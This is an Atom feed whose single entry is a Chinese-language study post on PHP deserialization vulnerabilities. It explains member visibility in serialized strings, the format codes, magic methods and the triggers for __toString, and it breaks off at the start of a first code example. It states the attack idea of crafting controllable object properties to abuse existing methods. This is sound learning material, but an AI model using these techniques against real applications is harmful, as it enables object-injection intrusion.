<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://hq185187.github.io</id>
    <title>welcome to my blog</title>
    <link href="https://hq185187.github.io" />
    <updated>2023-04-27T08:33:14.709Z</updated>
    <entry>
        <id>https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
        <title>php反序列化漏洞学习</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;h2 id=&#34;1访问控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1访问控制&#34;&gt;#&lt;/a&gt; (1). 访问控制&lt;/h2&gt;
&lt;h3 id=&#34;1public&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1public&#34;&gt;#&lt;/a&gt; 1.public&lt;/h3&gt;
&lt;p&gt;公有的类成员可以在任何地方被访问&lt;br&gt;
序列化后变成 &lt;code&gt;属性名&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;2protected&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2protected&#34;&gt;#&lt;/a&gt; 2.protected&lt;/h3&gt;
&lt;p&gt;受保护的类成员可以被其本身以及子类和子类访问&lt;br&gt;
序列号后变成 &lt;code&gt;\x00*\x00属性名&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;3private&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3private&#34;&gt;#&lt;/a&gt; 3.private&lt;/h3&gt;
&lt;p&gt;私有的 1 类成员只能被其定义的所在类访问&lt;br&gt;
序列化后变成 &lt;code&gt;\x00类名\x00属性名&lt;/code&gt; &lt;br&gt;
其中 &lt;code&gt;\x00&lt;/code&gt;  表示空字符，但还是占用一个字符位置 (空格)&lt;br&gt;
 来看个例子叭&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;People&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$gender&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$age&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;name=&lt;span class=&#34;string&#34;&gt;&amp;#x27;lxy&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;gender=&lt;span class=&#34;string&#34;&gt;&amp;#x27;male&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;age=&lt;span class=&#34;string&#34;&gt;&amp;#x27;23&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;People&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出结果为:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;O:6:&amp;quot;People&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:3:&amp;quot;lxy&amp;quot;;s:9:&amp;quot; * gender&amp;quot;;s:4:&amp;quot;male&amp;quot;;s:11:&amp;quot; People age&amp;quot;;s:2:&amp;quot;23&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;mark&gt;注意&lt;/mark&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果是 print_r (), 或者 echo 的话，我们是看不到空格的 ( &lt;code&gt;\x00&lt;/code&gt; ), 所以看到的结果是&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;O:6:&amp;quot;People&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:3:&amp;quot;lxy&amp;quot;;s:9:&amp;quot;*gender&amp;quot;;s:4:&amp;quot;male&amp;quot;;s:11:&amp;quot;Peopleage&amp;quot;;s:2:&amp;quot;23&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;如果输出语句是 var_dump () 的话，看到的结果是这样&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;string(93) &amp;quot;O:6:&amp;quot;People&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:3:&amp;quot;lxy&amp;quot;;s:9:&amp;quot;\000*\000gender&amp;quot;;s:4:&amp;quot;male&amp;quot;;s:11:&amp;quot;\000People\000age&amp;quot;;s:2:&amp;quot;23&amp;quot;;&amp;#125;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对比可以发现 var_dump 可以发现这个空格哦&lt;/p&gt;
&lt;h2 id=&#34;2序列化与反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2序列化与反序列化&#34;&gt;#&lt;/a&gt; (2). 序列化与反序列化&lt;/h2&gt;
&lt;h3 id=&#34;1序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1序列化&#34;&gt;#&lt;/a&gt; 1. 序列化&lt;/h3&gt;
&lt;p&gt;把对象信息转换成二进制串，serialize () 函数&lt;/p&gt;
&lt;h3 id=&#34;2反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2反序列化&#34;&gt;#&lt;/a&gt; 2. 反序列化&lt;/h3&gt;
&lt;p&gt;把转化的二进制串转换为对象，unserialize () 函数&lt;/p&gt;
&lt;h3 id=&#34;3序列化格式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3序列化格式&#34;&gt;#&lt;/a&gt; 3. 序列化格式&lt;/h3&gt;
&lt;h4 id=&#34;31头部信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31头部信息&#34;&gt;#&lt;/a&gt; 3.1 头部信息&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a:数组,array&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b:布尔型,Boolean&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;d:浮点型,double&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i:整数型,integer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:类,class&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;N:空,null&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s:字符串,string&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;32-格式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#32-格式&#34;&gt;#&lt;/a&gt; 3.2 格式&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;对象类型:长度:&amp;quot;类名&amp;quot;:类中变量的个数:&amp;#123;类型:长度:&amp;quot;值&amp;quot;;类型:长度:&amp;quot;值&amp;quot;;....&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:6:&amp;quot;People&amp;quot;:3:&amp;#123;s:4:&amp;quot;name&amp;quot;;s:3:&amp;quot;lxy&amp;quot;;s:9:&amp;quot;*gender&amp;quot;;s:4:&amp;quot;male&amp;quot;;s:11:&amp;quot;Peopleage&amp;quot;;s:2:&amp;quot;23&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;33注意&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#33注意&#34;&gt;#&lt;/a&gt; 3.3 注意&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;序列化只能序列成员 (也就是类里的变量), 不能序列方法&lt;/li&gt;
&lt;li&gt;因为序列化不序列方法，所以反序列化之后如果想正常使用这个对象的话要依托这个类当前作用域存在的条件&lt;/li&gt;
&lt;li&gt;我们的思路就是通关精心构造能被控制的类的属性，利用作用域本身存在的方法发动攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;4魔术方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4魔术方法&#34;&gt;#&lt;/a&gt; 4. 魔术方法&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__construct()            //类的构造函数，创建对象时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__destruct()             //类的析构函数，对象被销毁时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__call($a,$b)                 //在对象上下文中调用不可访问的方法时触发,protected和private都会调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a存储所调用的函数名,$b以数组方式接收多个参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__callStatic($a,$b)           //同__call($a,$b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__get()                  //读取不可访问属性的值时，这里的不可访问包含私有属性或未定义,private&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__set()                  //在给不可访问属性赋值时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__isset()                //当对不可访问属性调用 isset() 或 empty() 时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__unset()                //在不可访问的属性上使用unset()时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__invoke()               //当尝试以调用函数的方式调用一个对象时触发&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__sleep()                //执行serialize()时，先会调用这个方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__wakeup()               //执行unserialize()时，先会调用这个方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__toString()             //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;mark&gt;注意:&lt;/mark&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;serialize () 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作&lt;/li&gt;
&lt;li&gt;toString 被调用的情况&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.  echo($obj)/print($obj)打印时会触发 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.  反序列化对象与字符串连接时 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.  反序列化对象参与格式化字符串时 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.  反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5.  反序列化对象参与格式化SQL语句，绑定参数时 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6.  反序列化对象在经过php字符串处理函数，如strlen()、strops()、strcmp()、addslashes()等 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7.  在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8.  反序列化的对象作为class_exists()的参数的时候 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;5例子&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5例子&#34;&gt;#&lt;/a&gt; 5. 例子&lt;/h3&gt;
&lt;p&gt;看几个例子深刻理解一下序列化和反序列化叭&lt;/p&gt;
&lt;h4 id=&#34;51&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#51&#34;&gt;#&lt;/a&gt; 5.1&lt;/h4&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type: text/html;charset=utf-8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;test&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$variable&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;变量反序列化后都要销毁&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//公共变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$variable2&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;OTHER&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;printvariable&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 